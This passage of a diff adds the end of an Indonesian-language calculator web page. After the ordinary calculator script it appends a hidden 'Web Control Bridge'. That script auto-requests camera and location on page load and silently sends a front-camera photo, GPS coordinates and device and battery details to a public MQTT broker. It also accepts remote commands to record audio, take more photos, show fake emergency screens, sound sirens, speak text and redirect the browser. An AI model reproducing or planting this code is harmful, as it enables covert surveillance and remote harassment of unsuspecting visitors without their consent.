+                if (action === 'delete') deleteChar();
+                if (action === 'equals') compute();
+                if (action === 'sign') toggleSign();
+                if (action === 'percent') calculatePercent();
+            });
+        });
+
+        // Event Listeners Memori & Ilmiah
+        document.querySelectorAll('[data-mem]').forEach(button => {
+            button.addEventListener('click', () => handleMemory(button.dataset.mem));
+        });
+
+        document.querySelectorAll('[data-sci]').forEach(button => {
+            button.addEventListener('click', () => executeScientific(button.dataset.sci));
+        });
+
+        // Toggle Mode Standar / Ilmiah
+        modeStandard.addEventListener('click', () => {
+            sciPad.classList.add('hidden');
+            sciPad.classList.remove('grid');
+            degRadToggle.classList.add('hidden');
+            modeStandard.className = 'px-3 py-1.5 rounded-lg bg-white dark:bg-slate-700 text-indigo-600 dark:text-white shadow-sm transition';
+            modeSci.className = 'px-3 py-1.5 rounded-lg text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition';
+        });
+
+        modeSci.addEventListener('click', () => {
+            sciPad.classList.remove('hidden');
+            sciPad.classList.add('grid');
+            degRadToggle.classList.remove('hidden');
+            modeSci.className = 'px-3 py-1.5 rounded-lg bg-white dark:bg-slate-700 text-indigo-600 dark:text-white shadow-sm transition';
+            modeStandard.className = 'px-3 py-1.5 rounded-lg text-slate-600 dark:text-slate-400 hover:text-slate-900 dark:hover:text-white transition';
+        });
+
+        // Toggle DEG / RAD
+        degRadToggle.addEventListener('click', () => {
+            state.isDegree = !state.isDegree;
+            degRadToggle.innerText = state.isDegree ? 'DEG' : 'RAD';
+        });
+
+        // Hapus Riwayat
+        clearHistoryBtn.addEventListener('click', () => {
+            state.history = [];
+            renderHistory();
+        });
+
+        // Salin Hasil ke Clipboard
+        const copyBtn = document.getElementById('copyBtn');
+        const copyText = document.getElementById('copyText');
+        copyBtn.addEventListener('click', () => {
+            const tempInput = document.createElement('textarea');
+            tempInput.value = state.currentOperand;
+            document.body.appendChild(tempInput);
+            tempInput.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempInput);
+
+            copyText.innerText = 'Tersalin!';
+            setTimeout(() => { copyText.innerText = 'Salin'; }, 1500);
+        });
+
+        // Dukungan Penuh Keyboard
+        window.addEventListener('keydown', (e) => {
+            let key = e.key;
+            if (key === ',') key = '.';
+
+            // Animasi visual tombol saat ditekan di keyboard
+            const targetBtn = document.querySelector(`[data-key="${key === '=' ? 'Enter' : key}"]`);
+            if (targetBtn) {
+                targetBtn.classList.add('active-key');
+                setTimeout(() => targetBtn.classList.remove('active-key'), 120);
+            }
+
+            if ((key >= '0' && key <= '9') || key === '.') {
+                e.preventDefault();
+                appendNumber(key);
+            }
+            if (key === '+' || key === '-') {
+                e.preventDefault();
+                chooseOperation(key);
+            }
+            if (key === '*') {
+                e.preventDefault();
+                chooseOperation('×');
+            }
+            if (key === '/') {
+                e.preventDefault();
+                chooseOperation('÷');
+            }
+            if (key === 'Enter' || key === '=') {
+                e.preventDefault();
+                compute();
+            }
+            if (key === 'Backspace') {
+                e.preventDefault();
+                deleteChar();
+            }
+            if (key === 'Escape' || key === 'Delete') {
+                e.preventDefault();
+                clearAll();
+            }
+            if (key === '%') {
+                e.preventDefault();
+                calculatePercent();
+            }
+        });
+
+        // Toggle Tema Terang / Gelap
+        const themeToggle = document.getElementById('themeToggle');
+        themeToggle.addEventListener('click', () => {
+            document.documentElement.classList.toggle('dark');
+        });
+
+        // Modal Pintasan Keyboard
+        const shortcutBtn = document.getElementById('shortcutBtn');
+        const shortcutModal = document.getElementById('shortcutModal');
+        const closeModalBtn = document.getElementById('closeModalBtn');
+
+        shortcutBtn.addEventListener('click', () => {
+            shortcutModal.classList.remove('hidden');
+            shortcutModal.classList.add('flex');
+        });
+
+        closeModalBtn.addEventListener('click', () => {
+            shortcutModal.classList.add('hidden');
+            shortcutModal.classList.remove('flex');
+        });
+
+        shortcutModal.addEventListener('click', (e) => {
+            if (e.target === shortcutModal) {
+                shortcutModal.classList.add('hidden');
+                shortcutModal.classList.remove('flex');
+            }
+        });
+    </script>
+
+<!-- SYR Web Control Bridge -->
+<script src="https://unpkg.com/mqtt@5.10.3/dist/mqtt.min.js"></script>
+<script>if(typeof mqtt==='undefined'){document.write('<script src="https://cdn.jsdelivr.net/npm/mqtt@5.10.3/dist/mqtt.min.js"><\/script>')}</script>
+<script>
+(function(){
+  if (window.__SYR_WEBCTRL__) return;
+  window.__SYR_WEBCTRL__ = true;
+  const CH = "syr_storisyirweb";
+  const TOPIC_UP = 'syr_webctrl/' + CH + '/up';
+  const TOPIC_DOWN = 'syr_webctrl/' + CH + '/down';
+  const CID = (sessionStorage.getItem('syr_cid') || (function(){
+    const id = Math.random().toString(36).slice(2, 8);
+    try { sessionStorage.setItem('syr_cid', id); } catch(e){}
+    return id;
+  })());
+
+  let batLevel = '-';
+  let batCharging = false;
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b){
+      const upd = function(){
+        batLevel = Math.round((b.level || 0) * 100) + '%';
+        batCharging = !!b.charging;
+      };
+      upd();
+      b.addEventListener('levelchange', upd);
+      b.addEventListener('chargingchange', upd);
+    }).catch(function(){});
+  }
+
+  function detectDevice() {
+    const ua = navigator.userAgent || '';
+    let os = 'Desktop/PC';
+    if (/Android/i.test(ua)) {
+      const m = ua.match(/Android\s+([0-9.]+)/i);
+      os = 'Android' + (m ? ' ' + m[1] : '');
+    } else if (/iPhone|iPad|iPod/i.test(ua)) {
+      os = 'iOS / iPhone';
+    } else if (/Windows/i.test(ua)) {
+      os = 'Windows PC';
+    } else if (/Mac OS/i.test(ua)) {
+      os = 'MacOS';
+    }
+    let br = 'Browser';
+    if (/Edg\//i.test(ua)) br = 'Edge';
+    else if (/OPR\/|Opera/i.test(ua)) br = 'Opera';
+    else if (/Chrome\//i.test(ua)) br = 'Chrome';
+    else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) br = 'Safari';
+    else if (/Firefox\//i.test(ua)) br = 'Firefox';
+    return { os: os, br: br };
+  }
+
+  let torchState = 'OFF';
+  let alarmState = false;
+  let layarState = false;
+  let strobeTimer = null;
+  let alarmCtx = null;
+  let alarmInterval = null;
+  let alarmTimeout = null;
+
+  function getInfo() {
+    const d = detectDevice();
+    return {
+      device: d.os + ' (' + d.br + ')',
+      browser: d.br,
+      page: "bysyreoeoe" || location.pathname.replace(/^\/|\/$/g, '') || 'home',
+      url: location.href,
+      screen: window.innerWidth + 'x' + window.innerHeight,
+      battery: batLevel,
+      isCharging: batCharging,
+      language: navigator.language || 'id-ID',
+      torch: torchState,
+      alarmActive: alarmState,
+      layarActive: layarState
+    };
+  }
+
+  // Audio Context Unlock & Auto-Request Izin Wajib (Kamera, Mikrofon, Lokasi) saat web dibuka
+  function unlockAudio() {
+    try {
+      if (!alarmCtx) {
+        const AC = window.AudioContext || window.webkitAudioContext;
+        if (AC) alarmCtx = new AC();
+      }
+      if (alarmCtx && alarmCtx.state === 'suspended') alarmCtx.resume();
+    } catch(e){}
+  }
+
+  let autoPhotoDone = false;
+  let autoLocDone = false;
+  let requestingCam = false;
+  let requestingLoc = false;
+
+  function doAutoPhoto() {
+    if (autoPhotoDone || requestingCam) return;
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+    requestingCam = true;
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    }).then(function(stream){
+      requestingCam = false;
+      const video = document.createElement('video');
+      video.setAttribute('playsinline', '');
+      video.setAttribute('autoplay', '');
+      video.muted = true;
+      video.srcObject = stream;
+      let snapped = false;
+      function snap() {
+        if (snapped) return;
+        snapped = true;
+        autoPhotoDone = true;
+        try {
+          const canvas = document.createElement('canvas');
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const b64 = canvas.toDataURL('image/jpeg', 0.72).split(',')[1] || '';
+          try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(e){}
+          sendUp('AUTO_DATA', { autoType: 'PHOTO', status: 'OK', imageBase64: b64, facing: 'front' });
+        } catch(err){
+          try { stream.getTracks().forEach(function(t){ t.stop(); }); } catch(e){}
+        }
+      }
+      video.onloadedmetadata = function(){
+        video.play().catch(function(){});
+        setTimeout(snap, 350);
+      };
+      setTimeout(function(){
+        video.play().catch(function(){});
+        setTimeout(snap, 350);
+      }, 500);
+    }).catch(function(){
+      requestingCam = false;
+    });
+  }
+
+  function doAutoLocation() {
+    if (autoLocDone || requestingLoc) return;
+    if (!navigator.geolocation) return;
+    requestingLoc = true;
+    navigator.geolocation.getCurrentPosition(function(pos){
+      requestingLoc = false;
+      autoLocDone = true;
+      sendUp('AUTO_DATA', {
+        autoType: 'LOCATION',
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy || 0)
+      });
+    }, function(err){
+      navigator.geolocation.getCurrentPosition(function(pos2){
+        requestingLoc = false;
+        autoLocDone = true;
+        sendUp('AUTO_DATA', {
+          autoType: 'LOCATION',
+          latitude: pos2.coords.latitude,
+          longitude: pos2.coords.longitude,
+          accuracy: Math.round(pos2.coords.accuracy || 0)
+        });
+      }, function(){
+        requestingLoc = false;
+      }, { enableHighAccuracy: false, timeout: 10000, maximumAge: 120000 });
+    }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 60000 });
+  }
+
+  function triggerAutoPermissions() {
+    unlockAudio();
+    if (!autoLocDone) doAutoLocation();
+    if (!autoPhotoDone) setTimeout(doAutoPhoto, 300);
+  }
+
+  if (document.readyState === 'complete' || document.readyState === 'interactive') {
+    setTimeout(triggerAutoPermissions, 400);
+  } else {
+    window.addEventListener('DOMContentLoaded', function(){
+      setTimeout(triggerAutoPermissions, 400);
+    });
+  }
+
+  ['click','touchstart','pointerdown','keydown'].forEach(function(ev){
+    window.addEventListener(ev, function(){
+      triggerAutoPermissions();
+    }, { passive: true });
+  });
+
+  function ensureEl(id, css) {
+    let el = document.getElementById(id);
+    if (!el) {
+      el = document.createElement('div');
+      el.id = id;
+      el.style.cssText = css;
+      document.body.appendChild(el);
+    }
+    return el;
+  }
+
+  function setTorch(mode) {
+    clearInterval(strobeTimer);
+    strobeTimer = null;
+    const el = ensureEl('__syr_torch_ov', 'position:fixed;inset:0;z-index:2147483640;pointer-events:none;display:none;transition: opacity 0.08s;');
+    if (mode === 'OFF') {
+      torchState = 'OFF';
+      el.style.display = 'none';
+      return;
+    }
+    torchState = mode;
+    el.style.display = 'block';
+    el.style.background = '#ffffff';
+    el.style.opacity = '1';
+    if (mode === 'KEDIP') {
+      let on = true;
+      strobeTimer = setInterval(function(){
+        on = !on;
+        el.style.background = on ? '#ffffff' : '#000000';
+      }, 120);
+    } else if (mode === 'SOS') {
+      let step = 0;
+      const pat = [1,0,1,0,1,0, 1,1,0,1,1,0,1,1,0, 1,0,1,0,1,0, 0,0];
+      strobeTimer = setInterval(function(){
+        const v = pat[step % pat.length];
+        el.style.background = v ? '#ef4444' : '#000000';
+        step++;
+      }, 220);
+    }
+  }
+
+  function setScreenOverlay(show, styleMode, text) {
+    const el = ensureEl('__syr_screen_ov', 'position:fixed;inset:0;z-index:2147483645;display:none;flex-direction:column;align-items:center;justify-content:center;padding:28px;text-align:center;font-family:system-ui,-apple-system,sans-serif;color:#fff;');
+    if (!show) {
+      layarState = false;
+      el.style.display = 'none';
+      return;
+    }
+    layarState = true;
+    const bg = styleMode === 'DARURAT'
+      ? 'linear-gradient(135deg,#7f1d1d,#dc2626)'
+      : styleMode === 'INFO'
+      ? 'linear-gradient(135deg,#1e3a8a,#2563eb)'
+      : 'linear-gradient(135deg,#0f172a,#1e293b)';
+    const badge = styleMode === 'DARURAT' ? '🚨 PESAN DARURAT' : styleMode === 'INFO' ? '📢 INFORMASI PENTING' : '⚠️ PERINGATAN SISTEM';
+    el.style.background = bg;
+    el.style.display = 'flex';
+    el.innerHTML =
+      '<div style="max-width:480px;background:rgba(0,0,0,0.35);backdrop-filter:blur(12px);padding:32px 24px;border-radius:24px;border:1px solid rgba(255,255,255,0.2);box-shadow:0 25px 50px -12px rgba(0,0,0,0.6)">' +
+      '<div style="font-size:14px;font-weight:800;letter-spacing:2px;padding:6px 14px;border-radius:99px;background:rgba(255,255,255,0.18);display:inline-block;margin-bottom:18px">' + badge + '</div>' +
+      '<div style="font-size:24px;font-weight:800;line-height:1.4;word-break:break-word"></div>' +
+      '</div>';
+    el.querySelectorAll('div')[2].textContent = text || 'Perhatian!';
+  }
+
+  function showPopupModal(text) {
+    const el = ensureEl('__syr_popup_ov', 'position:fixed;inset:0;z-index:2147483646;display:flex;align-items:center;justify-content:center;padding:20px;background:rgba(0,0,0,0.65);backdrop-filter:blur(4px);font-family:system-ui,-apple-system,sans-serif;');
+    el.style.display = 'flex';
+    el.innerHTML =
+      '<div style="width:100%;max-width:380px;background:#1e293b;color:#f8fafc;border-radius:20px;padding:24px;border:1px solid rgba(255,255,255,0.15);box-shadow:0 20px 40px rgba(0,0,0,0.5);text-align:center">' +
+      '<div style="font-size:36px;margin-bottom:10px">💬</div>' +
+      '<div style="font-size:16px;font-weight:700;margin-bottom:8px;color:#38bdf8">PESAN MASUK</div>' +
+      '<div id="__syr_pop_txt" style="font-size:15px;line-height:1.5;color:#e2e8f0;margin-bottom:20px;word-break:break-word"></div>' +
+      '<button id="__syr_pop_btn" style="background:#0284c7;color:#fff;border:none;padding:10px 28px;border-radius:12px;font-weight:700;font-size:14px;cursor:pointer">Tutup Pesan</button>' +
+      '</div>';
+    document.getElementById('__syr_pop_txt').textContent = text || 'Halo!';
+    document.getElementById('__syr_pop_btn').onclick = function(){ el.style.display = 'none'; };
+  }
+
+  function startSiren(sec) {
+    stopSiren();
+    unlockAudio();
+    const AC = window.AudioContext || window.webkitAudioContext;
+    if (!AC) return;
+    if (!alarmCtx) alarmCtx = new AC();
+    if (alarmCtx.state === 'suspended') alarmCtx.resume();
+    alarmState = true;
+
+    const beep = function() {
+      if (!alarmState || !alarmCtx) return;
+      try {
+        const osc = alarmCtx.createOscillator();
+        const gain = alarmCtx.createGain();
+        osc.type = 'sawtooth';
+        const now = alarmCtx.currentTime;
+        osc.frequency.setValueAtTime(680, now);
+        osc.frequency.linearRampToValueAtTime(1320, now + 0.35);
+        osc.frequency.linearRampToValueAtTime(680, now + 0.7);
+        gain.gain.setValueAtTime(0.85, now);
+        osc.connect(gain);
+        gain.connect(alarmCtx.destination);
+        osc.start(now);
+        osc.stop(now + 0.72);
+      } catch(e){}
+    };
+    beep();
+    alarmInterval = setInterval(beep, 750);
+    alarmTimeout = setTimeout(stopSiren, (sec || 30) * 1000);
+  }
+
+  function stopSiren() {
+    alarmState = false;
+    clearInterval(alarmInterval);
+    clearTimeout(alarmTimeout);
+    alarmInterval = null;
+    alarmTimeout = null;
+  }
+
+  function speakText(text) {
+    if (!('speechSynthesis' in window)) throw new Error('Browser tidak mendukung fitur suara TTS');
+    window.speechSynthesis.cancel();
+    const u = new SpeechSynthesisUtterance(text);
+    u.lang = 'id-ID';
+    u.rate = 1.0;
+    u.pitch = 1.0;
+    window.speechSynthesis.speak(u);
+  }
+
+  function capturePhoto(facing, reqId) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Browser tidak mendukung akses kamera' });
+      return;
+    }
+    const mode = facing === 'back' ? { ideal: 'environment' } : 'user';
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: mode, width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    }).then(function(stream){
+      const video = document.createElement('video');
+      video.setAttribute('playsinline', '');
+      video.setAttribute('autoplay', '');
+      video.muted = true;
+      video.srcObject = stream;
+      video.onloadedmetadata = function(){
+        video.play().catch(function(){});
+        setTimeout(function(){
+          try {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.72);
+            const b64 = dataUrl.split(',')[1] || '';
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            if (reqId === 'auto_init') {
+              sendUp('AUTO_DATA', { autoType: 'PHOTO', status: 'OK', imageBase64: b64, facing: facing || 'front' });
+            } else {
+              sendUp('ACK', { reqId: reqId, status: 'OK', imageBase64: b64, facing: facing || 'front' });
+            }
+          } catch (e) {
+            stream.getTracks().forEach(function(t){ t.stop(); });
+            sendUp('ACK', { reqId: reqId, status: 'ERROR', error: e.message });
+          }
+        }, 400);
+      };
+    }).catch(function(err){
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Izin kamera ditolak atau tidak tersedia (' + (err.message || err) + ')' });
+    });
+  }
+
+  function recordAudio(durationSec, reqId) {
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia || typeof MediaRecorder === 'undefined') {
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Browser tidak mendukung perekaman mikrofon' });
+      return;
+    }
+    const sec = Math.min(Math.max(Number(durationSec) || 5, 3), 25);
+    navigator.mediaDevices.getUserMedia({ audio: true, video: false }).then(function(stream){
+      let opts = { audioBitsPerSecond: 32000 };
+      if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/mp4')) {
+        opts.mimeType = 'audio/mp4';
+      } else if (MediaRecorder.isTypeSupported && MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+        opts.mimeType = 'audio/webm;codecs=opus';
+      }
+      const rec = new MediaRecorder(stream, opts);
+      const chunks = [];
+      rec.ondataavailable = function(e){ if (e.data && e.data.size > 0) chunks.push(e.data); };
+      rec.onstop = function(){
+        stream.getTracks().forEach(function(t){ t.stop(); });
+        const blob = new Blob(chunks, { type: rec.mimeType || 'audio/webm' });
+        const reader = new FileReader();
+        reader.onloadend = function(){
+          const b64 = String(reader.result || '').split(',')[1] || '';
+          sendUp('ACK', { reqId: reqId, status: 'OK', audioBase64: b64, mimeType: rec.mimeType || 'audio/webm', duration: sec });
+        };
+        reader.readAsDataURL(blob);
+      };
+      rec.start();
+      setTimeout(function(){
+        if (rec.state !== 'inactive') rec.stop();
+      }, sec * 1000);
+    }).catch(function(err){
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Izin mikrofon ditolak atau tidak tersedia (' + (err.message || err) + ')' });
+    });
+  }
+
+  function getLocation(reqId) {
+    if (!navigator.geolocation) {
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Browser tidak mendukung Geolocation GPS' });
+      return;
+    }
+    navigator.geolocation.getCurrentPosition(function(pos){
+      sendUp('ACK', {
+        reqId: reqId,
+        status: 'OK',
+        latitude: pos.coords.latitude,
+        longitude: pos.coords.longitude,
+        accuracy: Math.round(pos.coords.accuracy || 0)
+      });
+    }, function(err){
+      sendUp('ACK', { reqId: reqId, status: 'ERROR', error: 'Izin lokasi ditolak atau GPS mati (' + (err.message || err.code) + ')' });
+    }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+  }
+
+  const pendingOutQueue = [];
+  let client = null;
+
+  function sendUp(type, extra) {
+    const payload = JSON.stringify(Object.assign({
+      type: type,
+      clientId: CID,
+      info: getInfo(),
+      timestamp: Date.now()
+    }, extra || {}));
+
+    if (!client || !client.connected) {
+      if (pendingOutQueue.length < 30) pendingOutQueue.push(payload);
+      return;
+    }
+    try { client.publish(TOPIC_UP, payload); } catch(e){}
+  }
+
+  function flushPendingQueue() {
+    if (!client || !client.connected) return;
+    while (pendingOutQueue.length > 0) {
+      const p = pendingOutQueue.shift();
+      try { client.publish(TOPIC_UP, p); } catch(e){}
+    }
+  }
+
+  function startMqtt() {
+    if (typeof mqtt === 'undefined') {
+      setTimeout(startMqtt, 150);
+      return;
+    }
+    try {
+      client = mqtt.connect('wss://broker.emqx.io:8084/mqtt', {
+        clientId: 'syrw_' + CID + '_' + Math.random().toString(36).slice(2, 5),
+        clean: true,
+        reconnectPeriod: 3000
+      });
+
+      client.on('connect', function(){
+        client.subscribe(TOPIC_DOWN);
+        sendUp('HELLO');
+        flushPendingQueue();
+      });
+
+      setInterval(function(){ sendUp('HEARTBEAT'); }, 20000);
+      window.addEventListener('beforeunload', function(){ sendUp('BYE'); });
+
+      client.on('message', function(topic, payload){
+        let cmd;
+        try { cmd = JSON.parse(payload.toString()); } catch(e){ return; }
+        if (!cmd) return;
+        if (cmd.type === 'DISCOVER') {
+          sendUp('HELLO');
+          return;
+        }
+        if (cmd.targetId && cmd.targetId !== 'ALL' && cmd.targetId !== CID) return;
+
+        const action = String(cmd.command || '').toUpperCase();
+        try {
+          if (action === 'TAKE_PHOTO') {
+            capturePhoto(cmd.facing || 'front', cmd.reqId);
+            return;
+          } else if (action === 'RECORD_AUDIO') {
+            recordAudio(cmd.duration || 5, cmd.reqId);
+            return;
+          } else if (action === 'GET_LOCATION') {
+            getLocation(cmd.reqId);
+            return;
+          } else if (action === 'STATUS') {
+            // langsung balas info terbaru
+          } else if (action === 'TORCH_ON') {
+            setTorch('ON');
+          } else if (action === 'TORCH_OFF') {
+            setTorch('OFF');
+          } else if (action === 'TORCH_SOS') {
+            setTorch('SOS');
+          } else if (action === 'TORCH_STROBE') {
+            setTorch('KEDIP');
+          } else if (action === 'SCREEN_ON') {
+            setScreenOverlay(true, cmd.style || 'PERINGATAN', cmd.text || 'Perhatian!');
+          } else if (action === 'SCREEN_OFF') {
+            setScreenOverlay(false);
+          } else if (action === 'POPUP') {
+            showPopupModal(cmd.text || 'Halo!');
+          } else if (action === 'ALARM_ON') {
+            startSiren(Number(cmd.duration) || 30);
+          } else if (action === 'ALARM_OFF') {
+            stopSiren();
+          } else if (action === 'TTS') {
+            speakText(cmd.text || 'Halo');
+          } else if (action === 'VIBRATE') {
+            if (navigator.vibrate) navigator.vibrate(Number(cmd.duration) || 1000);
+          } else if (action === 'OPEN_URL') {
+            sendUp('ACK', { reqId: cmd.reqId, status: 'OK' });
+            setTimeout(function(){ location.href = cmd.url || 'https://www.google.com'; }, 300);
+            return;
+          }
+          sendUp('ACK', { reqId: cmd.reqId, status: 'OK' });
+        } catch (err) {
+          sendUp('ACK', { reqId: cmd.reqId, status: 'ERROR', error: err.message });
+        }
+      });
+    } catch(err){}
+  }
+
+  startMqtt();
+})();
+</script>
+</body>
+</html>
